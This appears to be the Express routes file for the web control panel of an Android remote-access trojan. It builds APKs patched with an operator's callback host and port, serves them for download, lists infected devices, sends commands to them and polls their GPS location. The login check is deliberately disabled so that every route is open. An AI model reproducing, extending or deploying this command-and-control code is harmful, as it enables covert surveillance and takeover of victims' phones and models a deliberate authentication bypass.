const
    express = require('express'),
    routes = express.Router(),
    cookieParser = require('cookie-parser'),
    bodyParser = require('body-parser');

let CONST = global.CONST;
let db = global.db;
let logManager = global.logManager;
let app = global.app;
let clientManager = global.clientManager;
let apkBuilder = global.apkBuilder;

app.use(cookieParser());
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// ===== Login bypass =====
function isAllowed(req, res, next) {
    next(); // Always allow access without checking login
}
// ========================

routes.get('/dl', (req, res) => {
    res.redirect('/build.s.apk');
});

routes.get('/', isAllowed, (req, res) => {
    res.render('index', {
        clientsOnline: clientManager.getClientListOnline(),
        clientsOffline: clientManager.getClientListOffline()
    });
});

routes.get('/login', (req, res) => {
    // Auto-redirect to home since login is disabled
    res.redirect('/');
});

routes.post('/login', (req, res) => {
    // Skip login process and redirect
    res.redirect('/');
});

routes.get('/logout', isAllowed, (req, res) => {
    res.redirect('/');
});

routes.get('/builder', isAllowed, (req, res) => {
    res.render('builder', {
        myPort: CONST.control_port
    });
});

routes.post('/builder', isAllowed, (req, res) => {
    if ((req.query.uri !== undefined) && (req.query.port !== undefined)) {
        apkBuilder.patchAPK(req.query.uri, req.query.port, (error) => {
            if (!error) {
                apkBuilder.buildAPK((error) => {
                    if (!error) {
                        logManager.log(CONST.logTypes.success, "Build Succeeded!");
                        res.json({ error: false });
                    } else {
                        logManager.log(CONST.logTypes.error, "Build Failed - " + error);
                        res.json({ error });
                    }
                });
            } else {
                logManager.log(CONST.logTypes.error, "Build Failed - " + error);
                res.json({ error });
            }
        });
    } else {
        logManager.log(CONST.logTypes.error, "Build Failed - Missing parameters");
        res.json({ error: "Missing parameters" });
    }
});

routes.get('/logs', isAllowed, (req, res) => {
    res.render('logs', {
        logs: logManager.getLogs()
    });
});

routes.get('/manage/:deviceid/:page', isAllowed, (req, res) => {
    let pageData = clientManager.getClientDataByPage(req.params.deviceid, req.params.page, req.query.filter);
    if (pageData) {
        res.render('deviceManager', {
            page: req.params.page,
            deviceID: req.params.deviceid,
            baseURL: '/manage/' + req.params.deviceid,
            pageData
        });
    } else {
        res.render('deviceManager', {
            page: 'notFound',
            deviceID: req.params.deviceid,
            baseURL: '/manage/' + req.params.deviceid
        });
    }
});

routes.post('/manage/:deviceid/:commandID', isAllowed, (req, res) => {
    clientManager.sendCommand(req.params.deviceid, req.params.commandID, req.query, (error, message) => {
        if (!error) res.json({ error: false, message });
        else res.json({ error });
    });
});

routes.post('/manage/:deviceid/GPSPOLL/:speed', isAllowed, (req, res) => {
    clientManager.setGpsPollSpeed(req.params.deviceid, parseInt(req.params.speed), (error) => {
        if (!error) res.json({ error: false });
        else res.json({ error });
    });
});

module.exports = routes;
